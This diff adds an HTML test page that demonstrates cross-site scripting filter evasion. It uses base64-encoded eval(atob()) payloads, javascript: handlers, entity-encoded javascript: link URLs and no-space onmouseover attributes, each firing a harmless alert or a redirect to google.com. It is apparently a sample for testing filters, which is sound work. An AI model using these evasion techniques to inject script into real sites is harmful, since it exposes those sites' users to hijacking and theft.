@@ -1,0 +1,32 @@
+<html>
+
+	<body>
+		dangerous characters so far ( ) = ' " # &
+		</br></br>
+		dangerous words eval
+		</br></br>
+		
+		Base64 encoded payload in eval() function. alert box
+		<input type=button onclick="eval(atob('YWxlcnQoJ3hzcyEnKQ=='))" value="Trigger"/>
+		</br></br>
+		
+		Base64 encoded payload in eval() function. document.location redirection
+		<input type=button onclick="eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly93d3cuZ29vZ2xlLmNvbSI='))" value="click me"/>
+		</br></br>
+		
+		javascript: tag execution Alert Box
+		<input type=button onclick="javascript:alert('XSS!')" value="Trigger"/>
+		</br></br>
+		
+		encoded ASCII value. 
+		<a href="javascript&#0000058&#0000097lert(': and a encoded')">Click this link!</a>
+		</br>
+		encoded ASCII value.
+		<a href="javascript&#0000058&#0000097l&#0000101rt(': a and e encoded')">Click this link!</a>
+		</br></br>
+		
+		no space encoding
+		<img/src="funny.jpg"onmouseover=javascript:eval(alert('Successful&#32Lookmomnospace'))>
+		<img/src="funny.jpg"onmouseover=javascript:alert('Successful&#32Lookmomnospace')>
+	</body>
+</html>
